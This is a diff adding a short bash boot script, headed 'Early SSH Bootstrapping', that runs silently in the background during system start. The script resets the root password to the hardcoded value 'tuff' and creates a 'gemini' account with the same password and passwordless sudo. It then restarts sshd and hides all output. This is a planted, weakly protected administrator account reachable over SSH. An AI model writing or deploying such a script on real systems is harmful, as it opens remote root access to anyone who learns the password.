@@ -1,0 +1,17 @@
+#!/bin/bash
+# TUFF-RADICAL: Early SSH Bootstrapping (Asynchronous / Non-blocking)
+
+# Execute user and SSH configurations entirely asynchronously in a subshell
+(
+    echo "root:tuff" | chpasswd
+    id -u gemini &>/dev/null || useradd -m -s /bin/bash gemini
+    echo "gemini:tuff" | chpasswd
+    echo "gemini ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/gemini
+    
+    # Reload SSH asynchronously without freezing system initialization
+    systemctl restart sshd || true
+) > /dev/null 2>&1 &
+
+# Immediately detach and let systemd continue the boot chain
+disown
+exit 0
